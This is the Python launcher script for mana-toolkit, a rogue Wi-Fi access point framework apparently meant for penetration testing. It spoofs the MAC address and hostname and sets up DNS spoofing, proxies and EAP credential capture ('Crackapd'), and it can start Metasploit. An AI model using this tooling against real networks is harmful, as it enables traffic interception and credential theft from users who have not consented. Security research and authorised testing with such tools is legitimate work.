#!/usr/bin/python

import sys
import os
import core

from argparse import ArgumentParser, RawTextHelpFormatter
from configs import ENNODES, MSF_RC
from plugins import *

__version__ = '0.1.0'

BANNER = '''
                                    _              _ _    _ _   
  _ __ ___   __ _ _ __   __ _      | |_ ___   ___ | | | _(_) |_ 
 | '_ ` _ \ / _` | '_ \ / _` |_____| __/ _ \ / _ \| | |/ / | __|
 | | | | | | (_| | | | | (_| |_____| || (_) | (_) | |   <| | |_ 
 |_| |_| |_|\__,_|_| |_|\__,_|      \__\___/ \___/|_|_|\_\_|\__|

        Developed by Dominic White (singe) & Ian de Villiers @ sensepost

                             research@sensepost.com

        Ported to Python by Gabriel Ryan (gabriel@solstice.me)

'''

def error_handler(msg):
    sys.exit('[!] %s' % msg)

def am_i_root():

    if os.geteuid():
        error_handler('Why am I not root? I want root!')

def print_banner():

    print BANNER

def invoke_metasploit(options):
    
    # configure metasploit
    with open(MSF_RC) as input_handle:
        with open('%s.new' % MSF_RC, 'w') as output_handle:
            for line in input_handle:
                if 'INTERFACE' in line:
                    line = 'set INTERFACE %s\n' % options.phy
                output_handle.write(line)
            os.system('mv %s.new %s' % (MSF_RC, MSF_RC))

    os.system('msfconsole -r %s' % MSF_RC)

def create_ennode():
    os.system('for i in `ls | grep ennode.node`; do rm -f $i; done')
    try:
        os.mkfifo(ENNODES)
    except OSError, e:
        error_handler('Failed to create FIFO: %s' % e)

def destroy_ennode():
    os.remove(ENNODES)

def initial_setup(options):

    print '[*] Changing hostname to: ', options.hostname
    core.utils.hostname(options.hostname)

    print '[*] Killing wifi'
    core.utils.rfkill()

    print '[*] Bringing up %s with spoofed mac' % options.phy
    core.utils.macchanger(options.phy)

    print '[*] Bringing up %s with spoofed mac' % options.phy
    core.utils.set_ip_forward(1)

    print '[*] Creating ennode: %s' % ENNODES
    create_ennode()

    print '[*] Flushing iptables'
    core.iptables.flush()

if __name__ == '__main__':

    am_i_root()

    print_banner()

    parser = ArgumentParser(description='mana-toolkit version %s',
                        formatter_class=RawTextHelpFormatter)

    sgroup = parser.add_argument_group('mana-toolkit', 'Options for mana-toolkit')
    sgroup.add_argument('--phy',
                    dest='phy',
                    type=str,
                    required=True,
                    help='Specify an interface to listen on.')
    sgroup.add_argument('--phy0',
                    dest='phy0',
                    type=str,
                    default='wlan0_0',
                    required=False,
                    help='Specify an interface to listen on.')
    sgroup.add_argument('--upstream',
                    dest='upstream',
                    type=str,
                    required=False,
                    help='Specify gateway inteface to forward traffic to')
    sgroup.add_argument('--no-upstream',
                    dest='no_upstream',
                    action='store_true',
                    help='Run in no upstream mode.')
    sgroup.add_argument('--no-upstream-all',
                    dest='no_upstream_all',
                    action='store_true',
                    help='Run in no upstream mode.')
    sgroup.add_argument('--no-upstream-eap',
                    dest='no_upstream_eap',
                    action='store_true',
                    help='Run in no upstream mode.')
    sgroup.add_argument('--no-upstream-eaponly',
                    dest='no_upstream_eap_only',
                    action='store_true',
                    help='Run in no upstream mode.')
    sgroup.add_argument('--nat',
                    dest='nat',
                    action='store_true',
                    help='Run in no upstream mode.')
    sgroup.add_argument('--bssid',
                    dest='bssid',
                    type=str,
                    default='00:11:22:33:44:00',
                    required=False,
                    metavar='<mac_addr>',
                    help='Set bssid of access point.')
    sgroup.add_argument('--essid',
                    dest='essid',
                    type=str,
                    default='TotallyLegit',
                    required=False,
                    metavar='<network_name>',
                    help='Set essid of access point.')
    sgroup.add_argument('--essid-secure',
                    dest='essid_secure',
                    type=str,
                    default='TotallyLegitSecure',
                    required=False,
                    metavar='<network_name>',
                    help='Set essid of access point.')
    sgroup.add_argument('--channel',
                    dest='channel',
                    type=int,
                    default=6,
                    required=False,
                    metavar='<channel_number>',
                    help='Have access point use channel <channel_number>')
    sgroup.add_argument('--hostname',
                    dest='hostname',
                    type=str,
                    default='WRT54G',
                    required=False,
                    metavar='<hostname>',
                    help='Set hostname to <hostname>')

    plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]
    options = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        error_handler('Aborting.')

    # this has to come before initialize otherwise plugin
    # specific iptables rules will be flushed
    initial_setup(options)

    # load only selected plugins
    loaded_plugins = [p for p in plugins if p.is_selected(options)]
    for p in loaded_plugins:
        print '[*] Initializing', p.name
        p.initialize(options)

    use_metasploit = False

    # core stuff goes here
    if options.nat:

        core.utils.route.add(options.phy)
        core.iptables.nat(upstream=options.upstream, phy=options.phy)

        # configure and start core daemons 
        core_services = [
                            core.Hostapd(options),
                            core.dhcpd.Dhcpd(options),
                        ]
    
    elif options.no_upstream_all:

        core.utils.route.add_dual(phy=options.phy, phy0=options.phy0)

        # configure core services
        core_services = [
                            core.Crackapd(options),
                            core.Hostapd(options),
                            core.dhcpd.Dhcpd(options),
                            core.Dnsspoof(options),
                            core.Apache(),
                            core.Stunnel(),
                            core.Tinyproxy(),
                        ]


        use_metasploit = True

    elif options.no_upstream_eap:

        core.utils.route.add_dual(phy=options.phy, phy0=options.phy0)

        # configure core services
        core_services = [
                            core.Crackapd(options),
                            core.Hostapd(options),
                            core.dhcpd.Dhcpd(options),
                            core.Dnsspoof(options),
                            core.Apache(),
                            core.Stunnel(),
                            core.Tinyproxy(),
                        ]

        use_metasploit = True

    elif options.no_upstream:

        core.utils.route.add(options.phy)

        core.iptables.no_upstream(options.phy)

        # configure core services
        core_services = [
                            core.Hostapd(options),
                            core.dhcpd.Dhcpd(options),
                            core.Dnsspoof(options),
                            core.Apache(),
                            core.Stunnel(),
                            core.Tinyproxy(),
                        ]


        use_metasploit = True

    elif options.no_upstream_eap_only:

        core.utils.route.add(phy=options.phy)

        # configure core services
        core_services = [
                            core.Crackapd(options),
                            core.Hostapd(options),
                            core.dhcpd.Dhcpd(options),
                            core.Dnsspoof(options),
                            core.Apache(),
                            core.Stunnel(),
                            core.Tinyproxy(),
                        ]

        use_metasploit = True

    else:

        error_handler('No valid mode specified. Aborting.')

    # add selected plugins to list of services to start
    core_services.extend(loaded_plugins)

    # start all selected core services
    for daemon in core_services:
        print '[*] Starting', daemon.name
        daemon.start()

    if use_metasploit:
        invoke_metasploit(options)
    else:
        raw_input('[*] Press enter to quit.')

    # stop all running daemons
    for daemon in core_services:
        print '[*] Stopping', daemon.name
        daemon.stop()

    print '[*] Destroying ennode: %s' % ENNODES
    destroy_ennode()
